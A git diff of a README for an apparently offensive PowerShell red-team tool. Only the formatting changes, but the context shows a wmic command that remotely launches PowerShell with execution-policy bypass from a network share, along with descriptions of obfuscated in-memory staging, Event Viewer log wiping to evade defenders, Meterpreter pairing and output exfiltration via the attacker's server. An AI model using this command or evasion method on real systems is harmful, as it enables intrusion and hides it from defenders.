@@ -29,12 +29,14 @@ Of course, **feel free to reuse code parts for your own purpose in case of need 
             wmic.exe /node:"Victime-PC" /user:WORKGROUP\admin process call create "PowErSheLl -eXecUtIonpOliCY BypAsS -NopRofilE -fILe \\Vboxsvr\shared\BSIDESIE\class-derivation.ps1"
 	```
 
-    **Stage 2** (executed on target):
+    
+   **Stage 2** (executed on target):
          In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
 
          Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
          Stage 1 execution is not removed from logs for demo purpose, it should be modified for a total discretion ;).
-	 
+
+
    [*] Notes:
         C2C shell could be used in combination to unicorn to obtains Meterpreter session (stage 2 could be modified depending on the use case):
         
@@ -42,7 +44,7 @@ Of course, **feel free to reuse code parts for your own purpose in case of need 
 
         IMPORTANT: Payload delivery using "-File" parameter also permit to add hashes collection when payload (stage 2) is triggered.
 
-    **stage 3** (executed on target):
+   **stage 3** (executed on target):
         Payload execution and output push/pull via a random file located on attacker's server.
 	
 ## Demo
